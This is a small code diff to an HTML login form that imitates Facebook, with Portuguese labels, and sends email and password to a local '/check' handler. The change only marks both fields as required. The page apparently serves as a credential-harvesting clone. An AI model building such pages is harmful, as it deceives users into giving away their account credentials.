@@ -26,8 +26,8 @@
 <h1  class = "login-header">Facebook</h1>
 
   <form     method = "POST" action         = "/check" class      = "login-container">
-  <p><input type   = "email" name          = "email" placeholder = "Email"></p>
-  <p><input id     = "password-field" name = "senha"type         = "password" class = "form-control" name = "password" placeholder = "Senha">
+  <p><input required = "required" type   = "email" name          = "email" placeholder = "Email"></p>
+  <p><input required = "required" id     = "password-field" name = "senha"type         = "password" class = "form-control" name = "password" placeholder = "Senha">
     
       <abbr title = "Ver senha"><span toggle = "#password-field" class = "fa fa-fw fa-eye field-icon toggle-password"></span></abbr>
     </p>
